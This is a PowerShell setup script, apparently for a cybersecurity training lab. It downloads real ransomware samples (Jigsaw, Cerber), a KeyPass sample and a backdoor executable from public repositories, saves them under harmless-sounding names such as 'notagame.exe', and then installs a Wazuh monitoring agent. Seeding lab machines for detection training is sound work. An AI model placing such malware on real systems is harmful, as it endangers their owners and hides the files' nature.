#ps1_sysnative
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11"
Invoke-WebRequest -Uri 'https://github.com/ytisf/theZoo/raw/master/malwares/Binaries/Ransomware.Jigsaw/Ransomware.Jigsaw.zip' -Outfile 'c:\newTools.zip'
Invoke-WebRequest -Uri 'https://github.com/ytisf/theZoo/raw/master/malwares/Binaries/Ransomware.Cerber/Ransomware.Cerber.zip' -Outfile 'c:\BabyStuff.zip'
Invoke-WebRequest -Uri 'https://github.com/ytisf/theZoo/raw/master/malwares/Binaries/Win32.KeyPass/Win32.KeyPass.zip' -Outfile 'c:\keys.zip'
Invoke-WebRequest -Uri 'https://github.com/GA-CyberWorkforceAcademy/metaTest/raw/5b7c94843fb433da9fdca33e165c566c1712a0de/resources/backdoors/notashell.exe' -Outfile 'c:\notagame.exe'
Invoke-WebRequest -Uri 'https://packages.wazuh.com/3.x/windows/wazuh-agent-3.6.1-1.msi' -Outfile 'c:\wazuh.msi'
start-process c:\wazuh.msi -ArgumentList 'ADDRESS="10.223.0.250" AUTHD_SERVER="10.223.0.250" /passive' -wait

